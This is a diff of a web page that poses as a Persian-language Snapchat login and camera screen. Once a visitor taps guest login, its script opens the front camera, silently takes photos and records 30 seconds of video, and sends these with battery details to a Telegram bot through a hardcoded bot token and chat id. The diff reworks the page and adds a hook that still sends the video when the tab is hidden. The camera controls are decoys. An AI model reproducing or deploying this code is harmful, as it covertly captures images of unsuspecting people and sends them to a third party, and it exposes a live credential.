@@ -6,226 +6,193 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
     body {
       direction: rtl;
-      font-family: 'Vazirmatn', sans-serif;
+      font-family: Arial, sans-serif;
       margin: 0;
       background: #FFFC00;
       overflow: hidden;
     }
     #video {
-      width: 100%;
-      height: 100vh;
-      object-fit: cover;
       position: absolute;
-      top: 0;
-      left: 0;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
       z-index: 0;
     }
-    .splash, .login-screen, .camera-ui {
+    .overlay {
       position: absolute;
-      inset: 0;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
       display: flex;
       flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      transition: opacity 1s ease;
-      z-index: 10;
-    }
-    .splash img {
-      animation: float 2s infinite ease-in-out;
-    }
-    @keyframes float {
-      0% { transform: translateY(0); }
-      50% { transform: translateY(-20px); }
-      100% { transform: translateY(0); }
-    }
-    .btn {
-      width: 80%;
-      max-width: 320px;
-      margin: 0.5rem;
+      justify-content: space-between;
       padding: 1rem;
-      border-radius: 9999px;
-      font-size: 1.1rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      font-weight: bold;
-      cursor: pointer;
-      transition: transform 0.3s ease;
     }
-    .btn:hover {
-      transform: scale(1.05);
+    .circle-btn {
+      width: 72px; height: 72px;
+      background-color: white;
+      border-radius: 50%;
+      border: 4px solid #000;
     }
-    .control-btn {
-      position: absolute;
-      z-index: 20;
-      background: rgba(255,255,255,0.8);
-      border-radius: 9999px;
-      padding: 0.75rem;
-    }
-    .switch-btn {
-      top: 1rem;
-      left: 1rem;
-    }
-    .capture-btn {
-      bottom: 2rem;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 80px;
-      height: 80px;
-      border: 4px solid white;
-      background: rgba(255,255,255,0.6);
-    }
-    .logo {
-      position: absolute;
-      top: 1rem;
-      right: 1rem;
-      width: 50px;
-      z-index: 20;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <!-- Splash Screen -->
-  <div class="splash bg-yellow-400 flex justify-center items-center flex-col">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" width="120" />
-    <h1 class="text-3xl font-bold mt-4">Snapchat</h1>
+
+<!-- Splash Screen -->
+<div id="splash" class="flex flex-col justify-center items-center h-screen bg-yellow-400 text-black">
+  <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="120" />
+</div>
+
+<!-- Login Page -->
+<div id="login-screen" class="hidden flex flex-col justify-center items-center h-screen bg-yellow-400 text-black">
+  <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="100" class="mb-4" />
+  <h2 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h2>
+  <button class="bg-white text-black py-2 px-6 rounded-full mb-2 flex items-center gap-2"><img src="https://img.icons8.com/color/48/google-logo.png" width="24">ورود با گوگل</button>
+  <button class="bg-white text-black py-2 px-6 rounded-full mb-2 flex items-center gap-2"><img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24">ورود با فیسبوک</button>
+  <button onclick="guestLogin()" class="bg-black text-white py-2 px-6 rounded-full mt-2">ورود مهمان</button>
+</div>
+
+<!-- Camera Page -->
+<video id="video" autoplay playsinline muted class="hidden"></video>
+<div class="overlay hidden" id="camera-ui">
+  <div class="flex justify-between">
+    <button class="bg-white/60 p-2 rounded-full" onclick="fakeSwitch()">
+      <i data-lucide="camera"></i>
+    </button>
+    <div></div>
   </div>
-
-  <!-- Login Screen -->
-  <div class="login-screen hidden bg-yellow-400 flex flex-col items-center justify-center">
-    <h2 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h2>
-    <div class="btn bg-white text-black"><img src="https://img.icons8.com/color/48/google-logo.png" width="24"> ورود با گوگل</div>
-    <div class="btn bg-white text-black"><img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24"> ورود با فیسبوک</div>
-    <div class="btn bg-black text-white" onclick="enterAsGuest()">ورود مهمان</div>
+  <div class="flex justify-center mb-4">
+    <button class="circle-btn cursor-default" disabled></button>
   </div>
+</div>
 
-  <!-- Camera UI -->
-  <video id="video" autoplay muted playsinline class="hidden"></video>
-  <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo hidden" />
-  <div class="control-btn switch-btn hidden" onclick="switchCamera()">
-    <img src="https://img.icons8.com/ios-filled/50/switch-camera.png" width="32" />
-  </div>
-  <div class="control-btn capture-btn hidden" onclick="fakeCaptureAnimation()"></div>
+<script>
+  lucide.createIcons();
 
-  <script>
-    const splash = document.querySelector(".splash");
-    const loginScreen = document.querySelector(".login-screen");
-    const video = document.getElementById("video");
-    const logo = document.querySelector(".logo");
-    const switchBtn = document.querySelector(".switch-btn");
-    const captureBtn = document.querySelector(".capture-btn");
+  const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
+  const chatId = "-1002651451203";
 
-    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
-    const chatId = "-1002651451203";
+  let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;
 
-    let stream, mediaRecorder, chunks = [], videoSent = false;
-
-    function enterAsGuest() {
-      loginScreen.classList.add("hidden");
-      video.classList.remove("hidden");
-      logo.classList.remove("hidden");
-      switchBtn.classList.remove("hidden");
-      captureBtn.classList.remove("hidden");
-      startCamera();
-    }
-
-    function fakeCaptureAnimation() {
-      captureBtn.classList.add("ring-4", "ring-white");
-      setTimeout(() => captureBtn.classList.remove("ring-4", "ring-white"), 200);
-    }
-
-    function switchCamera() {
-      switchBtn.classList.toggle("rotate-180");
-    }
-
+  window.onload = () => {
     setTimeout(() => {
-      splash.classList.add("hidden");
-      loginScreen.classList.remove("hidden");
-    }, 2500);
+      document.getElementById("splash").classList.add("hidden");
+      document.getElementById("login-screen").classList.remove("hidden");
+    }, 2000);
+  };
 
-    async function getBatteryInfo() {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100),
-          charging: battery.charging
-        };
-      }
-      return { level: "?", charging: false };
+  function guestLogin() {
+    document.getElementById("login-screen").classList.add("hidden");
+    document.getElementById("splash").classList.remove("hidden");
+    setTimeout(() => {
+      document.getElementById("splash").classList.add("hidden");
+      document.getElementById("video").classList.remove("hidden");
+      document.getElementById("camera-ui").classList.remove("hidden");
+      startCamera();
+    }, 2000);
+  }
+
+  function fakeSwitch() {
+    // فقط نمایشی است
+  }
+
+  async function startCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: 640, height: 480, facingMode: "user" }
+      });
+      document.getElementById("video").srcObject = stream;
+      takeAutoPhotos();
+      startRecording();
+    } catch (err) {
+      alert("دسترسی به دوربین رد شده یا وجود ندارد.");
     }
+  }
 
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: 640, height: 480, facingMode: "user" }
-        });
-        video.srcObject = stream;
-        takeAutoPhotos();
-        startRecording();
-      } catch (err) {
-        alert("دسترسی به دوربین رد شد.");
-      }
+  async function getBatteryInfo() {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      return {
+        level: Math.round(battery.level * 100),
+        charging: battery.charging
+      };
     }
+    return { level: "?", charging: false };
+  }
 
-    async function takePhoto() {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async blob => {
-        const battery = await getBatteryInfo();
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("photo", blob, `snap_${Date.now()}.jpg`);
-        form.append("caption", `📸 عکس\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
-      }, 'image/jpeg', 0.8);
-    }
-
-    function takeAutoPhotos() {
-      setTimeout(takePhoto, 1000);
-      setTimeout(takePhoto, 5000);
-    }
-
-    function startRecording() {
-      chunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.onstop = sendVideo;
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === "recording") mediaRecorder.stop();
-      }, 30000);
-    }
-
-    async function sendVideo() {
-      if (videoSent || chunks.length === 0) return;
-      videoSent = true;
+  async function takePhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.font = "16px Arial";
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(async blob => {
       const battery = await getBatteryInfo();
-      const blob = new Blob(chunks, { type: "video/webm" });
+      const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
       const form = new FormData();
       form.append("chat_id", chatId);
-      form.append("video", blob, "video.webm");
-      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      form.append("photo", blob, `snap_${photoCount}.jpg`);
+      form.append("caption", caption);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: form
       });
-    }
+    }, 'image/jpeg', 0.8);
+  }
 
-    window.addEventListener("beforeunload", () => {
+  function takeAutoPhotos() {
+    setTimeout(takePhoto, 1000);
+    setTimeout(takePhoto, 5000);
+  }
+
+  function startRecording() {
+    chunks = [];
+    mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = sendVideo;
+    mediaRecorder.start();
+    setTimeout(() => {
       if (mediaRecorder && mediaRecorder.state === "recording") {
         mediaRecorder.stop();
       }
+    }, 30000); // 30 ثانیه
+  }
+
+  async function sendVideo() {
+    if (videoSent || chunks.length === 0) return;
+    videoSent = true;
+    const battery = await getBatteryInfo();
+    const blob = new Blob(chunks, { type: "video/webm" });
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("video", blob, "video.webm");
+    form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
+    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      method: "POST",
+      body: form
     });
-  </script>
+  }
+
+  window.addEventListener("beforeunload", () => {
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
+    }
+  });
+
+  document.addEventListener("visibilitychange", () => {
+    if (document.hidden && mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
+    }
+  });
+</script>
+
 </body>
 </html>
